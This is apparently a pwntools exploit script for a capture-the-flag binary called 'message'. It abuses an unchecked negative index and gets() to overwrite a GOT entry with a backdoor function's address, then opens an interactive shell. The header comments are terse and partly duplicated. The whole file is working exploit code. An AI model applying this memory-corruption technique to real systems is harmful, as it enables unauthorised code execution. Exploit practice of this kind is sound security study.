#backdoor : 0x4009AE;gets(16 * v2 + 0x6012C8, &buf);
#idx = atoi(buf);  gets(data[idx].buf); 0x6012c0;v2 == idx
#puts_GOT -> backdoor_addr ;0x400630;(0x6012c0-0x400630)/16=131273
#FFFF FFFF FFFF FFF7 = -9context.binary = 'for'
#context(os='linux', log_level='debug')
#atoicontext.binary = 'for'
#context(os='linux', log_level='debug')
from pwn import*

context(os = 'linux',log_level = 'debug')
content = 1
def main():
    if content == 1:
        y = process('./message')
    else:
        y = remote('',)
    gdb.attach(y, 'b * 0x4008E6')
    backdoor_addr = 0x4009AE
    atoigot_addr  = 0x601240
    num_fu9 = 0xfffffffffffffff7
    #num_fu9 = 0xFFFFFFFFFFFFFFFE
    y.recvuntil("3. oh, I don't have any, I choose exit!\n")
    y.sendline("1")
    y.recvuntil("Whice friend do you want to leave for?\n")
    y.sendline("1") # 1

    payload2 = p64(backdoor_addr)
    payload = 0x8 * 'a' +p64(num_fu9)
    y.recvuntil("What do you want to leave?\n")
    y.sendline(payload) #1 

    y.recvuntil("3. oh, I don't have any, I choose exit!\n")
    y.sendline("1")
    y.recvuntil("Whice friend do you want to leave for?\n")
    y.sendline("2")
    y.recvuntil("What do you want to leave?\n")
    y.sendline("1") # 2

    y.recvuntil("3. oh, I don't have any, I choose exit!\n")
    y.sendline("1")
    y.recvuntil("Whice friend do you want to leave for?\n")
    y.sendline("2")
    y.recvuntil("What do you want to leave?\n")
    y.sendline('a' * 0x8 + payload2) #3

    y.interactive()

main()